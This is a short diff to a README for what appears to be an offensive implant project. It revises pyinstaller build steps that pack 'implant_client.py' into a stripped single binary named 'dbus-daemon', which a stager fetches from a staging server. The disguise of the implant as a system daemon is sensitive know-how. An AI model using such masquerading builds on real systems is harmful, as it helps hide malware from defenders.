@@ -77,11 +77,11 @@ The stager downloads the pre-built `dbus-daemon` binary from the staging server,
 The binary must be compiled on Linux (WSL works):
 
 ```bash
-pyinstaller --onefile --noupx --name dbus-daemon \
+pyinstaller --onefile --strip --noupx --name dbus-daemon \
     --hidden-import ssl --hidden-import _ssl \
     --collect-all cryptography \
     implant_client.py
-cp dist/dbus-daemon milestone2/staging/dbus-daemon
+cp dist/dbus-daemon staging/dbus-daemon
 ```
 
 ## Build & Run
